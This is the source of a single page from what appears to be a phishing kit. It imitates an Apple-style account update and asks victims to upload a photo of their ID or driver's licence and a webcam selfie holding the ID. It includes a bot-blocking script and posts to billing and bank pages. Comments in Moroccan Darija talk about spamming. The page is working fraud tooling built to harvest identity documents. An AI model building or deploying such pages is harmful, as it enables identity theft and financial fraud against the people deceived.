
<?php

include "bots.php";  //Para Bloquear Algunas IPs / wa7d 2 3 , bba mcha lsbata chrali 9amija ana wkhti khadija 


?>

<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
<head>
<title> Now you have to update your ...</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="Description" content="">
<link rel="shortcut icon" <link rel="logo-icon" href="../set/img/iconisma.ico">

<script language=Javascript>
      <!--
     /*
     Hna kayna talghima hhhh , n3al chitina , wa lah yarde 3lik awldi , sir ana rade 3lik danya o akhra .
	 chof tfout ghi ras o tji fin ma bghat , o ta karak tahouwa 7deh taki 3lih la tji fih 
	 matjich ghi fras o lkar ok :) , o l9alb ? 
	 9albi 7ajra mlin kanspami wakha 3amrni sendit hhhh, ma3linach aham 7aja howa ras o lkar matjij fihoum .
	 nsawb l7babi l2adawat free o mantkbara 3la tawa7d nt3awno n9adro njibo chi 9alwa o zwaml nasaba li kaylaghmo 
	ghadi ntaya7 3lihoum lba9 , lah yahdihoum  
     */
      function onlyNumbersDano(evt)
      {
        var keyPressed = (evt.which) ? evt.which : event.keyCode
        return !(keyPressed > 31 && (keyPressed < 48 || keyPressed > 57));
      }
      //-->
   </script>
     
   
		<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">


	
	<!-- CSS -->
	<link rel="stylesheet" href="../set/css/demo.css">
	<link rel="stylesheet" href="../set/css/bootstrap.css">
	<link rel="stylesheet" href="../set/css/imgpicker.css">
	<link rel="stylesheet" type="text/css" href="../set/cssisma/mestili-4.css">
	
	<!-- JavaScript -->
	<script src="../set/js/jquery-1.11.0.min.js"></script>
	<script src="../set/js/jquery.Jcrop.min.js"></script>
	<script src="../set/js/jquery.imgpicker.js"></script>
</head>



<body  >
<link rel="stylesheet" href="../set/cssisma/tot.css" type="text/css"/>
<nav id="UK747900-free-tools" class="UK747900-free-tools" role="navigation" aria-label="Global Navigation" data-hires="false" data-analytics-region="global nav" lang="en-US">
<div id="gh-content" class="gh-content">
	<div class="UK747900-nav">
		<ul class="UK747900-nav-lista">
			<li class="isma tabl-tfa7a-ma3douda"><a class="UK747900-link" href="billing.php"><span class="UK747900AA"></span></a></li>
			<li class="isma tabl-maaak"><a class="UK747900-link" href="billing.php"><span class="UK747900AA"></span></a></li>
			<li class="isma tabl-iphone"><a class="UK747900-link" href="billing.php"><span class="UK747900AA"></span></a></li>
			<li class="isma tabl-lkhra"><a class="UK747900-link" href="billing.php"><span class="UK747900AA"></span></a></li>
			<li class="isma tabl-ipaaad"><a class="UK747900-link" href="billing.php"><span class="UK747900AA"></span></a></li>
			<li class="isma tabl-hhhhhh"><a class="UK747900-link" href="billing.php"><span class="UK747900AA"></span></a></li>
			<li class="isma tabl-morocco"><a class="UK747900-link" href="billing.php"><span class="UK747900AA"></span></a></li>
			<li class="isma tabl-Espaï¿½a"><a class="UK747900-link" href="billing.php"><span class="UK747900AA"></span></a></li>
			<li id="UK747900-buscar" class="isma UK747900-buscar">
			<div id="takhwar" class="takhwar" role="search">
			</div>
			<a class="takhwar-zok" href="../UK747900"><span class="gh-text-replace">www.UK747900.com</span></a>
			</li>
		</ul>
	</div>
</div>
</nav>
<div >
<style>
.cover {
width: 205px; 
float: right; 
position: absolute; 
display:none;
background: rgba(255, 255, 255, 0.50) none repeat scroll 0% 0%; height: 170px;

}
.img{
height: 25px; left:50px; width: auto; border-radius: 10px; position: relative; top: 25px;
}
</style>
<form action="BNNK.php">
		<div style="max-width: 85%; text-align: center;" class="container"><div class="box">
			<div class="content clearfix" style=" ">
				<div class="content clearfix" style="width: 185px; float: left;">
				<img src="../set/cssisma/UK747900/id.png" id="avatar2" style="height: 150px; width: auto; border-radius: 10px;"><br>
				<br>
				<button type="button" class="btn btn-default" data-ip-modal="#avatarModal">ID / Driver licence</button>
				</div>
				<div class="content clearfix" style="width: 185px; float: right;">
				<img src="../set/img/selfie.png" id="avatar3" style="height: 150px; width: auto; border-radius: 10px;"><br>
				<br >
				<button type="button" class="btn btn-default" data-ip-modal="#avatarModal2">Selfie</button>
				</div>
				<div  id="cover" name="cover" class="cover" style="left: 60px; ">
				<img class="img" src="https://cdn4.iconfinder.com/data/icons/icocentre-free-icons/137/f-check_256-512.png"  ><br>
				</div>
				<div id="cover2" name="cover2" class="cover" style="left: 320px; ">
				<img class="img" src="https://cdn4.iconfinder.com/data/icons/icocentre-free-icons/137/f-check_256-512.png"  ><br>
				</div>
				<!-- Avatar Modal -->
				<div class="ip-modal" id="avatarModal">
					<div class="ip-modal-dialog">
						<div class="ip-modal-content">
							<div class="ip-modal-header">
								<a class="ip-close" title="Close">&times;</a>
								<h4 class="ip-modal-title">Proof of the Ownership Upload a copy of your ID</h4>
							</div>
							<div class="ip-modal-body">
								<div class="btn btn-primary ip-upload">Upload <input type="file" name="file" class="ip-file"></div>
								<button type="button" class="btn btn-primary ip-webcam">Webcam</button>
							
								
								
								<div class="alert ip-alert"></div>
								<div class="ip-info">To crop this image, drag a region below and then click "Save Image"</div>
								<div class="ip-preview"></div>
								<div class="ip-rotate">
									<button type="button" class="btn btn-default ip-rotate-ccw" title="Rotate counter-clockwise"><i class="icon-ccw"></i></button>
									<button type="button" class="btn btn-default ip-rotate-cw" title="Rotate clockwise"><i class="icon-cw"></i></button>
								</div>
								<div class="ip-progress">
									<div class="text">Uploading</div>
									<div class="progress progress-striped active"><div class="progress-bar"></div></div>
								</div>
							</div>
							<div class="ip-modal-footer">
								<div class="ip-actions">
									<button type="button" class="btn btn-success ip-save">Save Image</button>
									<button type="button" class="btn btn-primary ip-capture">Capture</button>
									<button type="button" class="btn btn-default ip-cancel">Cancel</button>
								</div>
								<button type="button" class="btn btn-default ip-close">Close</button>
							</div>
						</div>
					</div>
				</div>
				<!-- end Modal -->
				<div class="ip-modal" id="avatarModal2">
					<div class="ip-modal-dialog">
						<div class="ip-modal-content">
							<div class="ip-modal-header">
								<a class="ip-close" title="Close">&times;</a>
								<h4 class="ip-modal-title">Please turn on your camera to take a picture of you with your ID</h4>
							</div>
							<div class="ip-modal-body">
								<div class="btn btn-primary ip-upload">Upload <input type="file" name="file" class="ip-file"></div>
								<button type="button" class="btn btn-primary ip-webcam">Webcam</button>
							
								
								
								<div class="alert ip-alert"></div>
								<div class="ip-info">To crop this image, drag a region below and then click "Save Image"</div>
								<div class="ip-preview"></div>
								<div class="ip-rotate">
									<button type="button" class="btn btn-default ip-rotate-ccw" title="Rotate counter-clockwise"><i class="icon-ccw"></i></button>
									<button type="button" class="btn btn-default ip-rotate-cw" title="Rotate clockwise"><i class="icon-cw"></i></button>
								</div>
								<div class="ip-progress">
									<div class="text">Uploading</div>
									<div class="progress progress-striped active"><div class="progress-bar"></div></div>
								</div>
							</div>
							<div class="ip-modal-footer">
								<div class="ip-actions">
									<button type="button" class="btn btn-success ip-save">Save Image</button>
									<button type="button" class="btn btn-primary ip-capture">Capture</button>
									<button type="button" class="btn btn-default ip-cancel">Cancel</button>
								</div>
								<button type="button" class="btn btn-default ip-close">Close</button>
							</div>
						</div>
					</div>
				</div>
				

		</div>
		</div>
		
		</div>
		<br>
		

	<script> 
	var pht = 0;
	var pht2 = 0;
	
		$(function() {
			var time = function(){return'?'+new Date().getTime()};
			
			// Avatar setup
			$('#avatarModal').imgPicker({
				url: '../server/upload_avatar_autoload.php',
				aspectRatio: 1,
				loadComplete: function(image) {
					$('#avatar2').attr('src', '../'+image.versions.avatar.url +time() );
					this.setImage(image);
				},
				deleteComplete: function() {
					$('#avatar2').attr('src', '../set/img/default-avatar.png');
					this.modal('hide');
				},
				cropSuccess: function(image) {
					$('#avatar2').attr('src', '../'+image.versions.avatar.url +time() );
					this.modal('hide');
					
				document.getElementById('cover').style.display = 'block';
					pht = 1;
					check();
				}
			});

			// Demo only
			$('.navbar-toggle').on('click',function(){$('.navbar-nav').toggleClass('navbar-collapse')});
			$(window).resize(function(e){if($(document).width()>=430)$('.navbar-nav').removeClass('navbar-collapse')});
		}); 


		$(function() {
			var time = function(){return'?'+new Date().getTime()};
			
			// Avatar setup
			$('#avatarModal2').imgPicker({
				url: '../server/upload_avatar_autoload.php',
				aspectRatio: 1,
				loadComplete: function(image) {
					$('#avatar3').attr('src', '../'+image.versions.avatar.url +time() );
					this.setImage(image);
				},
				deleteComplete: function() {
					$('#avatar3').attr('src', '../set/img/default-avatar.png');
					this.modal('hide');
				},
				cropSuccess: function(image) {
					$('#avatar3').attr('src', '../'+image.versions.avatar.url +time() );
					this.modal('hide');
						
				document.getElementById('cover2').style.display = 'block';
					pht2 = 1;
					check();
			}
			});

			// Demo only
			$('.navbar-toggle').on('click',function(){$('.navbar-nav').toggleClass('navbar-collapse')});
			$(window).resize(function(e){if($(document).width()>=430)$('.navbar-nav').removeClass('navbar-collapse')});
		}); 
		function check(){
		if (pht2 == 1 && pht == 1){
				
				
					document.getElementById("btns").disabled = false; 
			}	
			}
	</script>
	


<input id="btns" name="btns" value="Confirm And Save" class="btn btn-info active"  type="submit" disabled="disabled" >

</form >


	


</div>


		
</body>
</html>


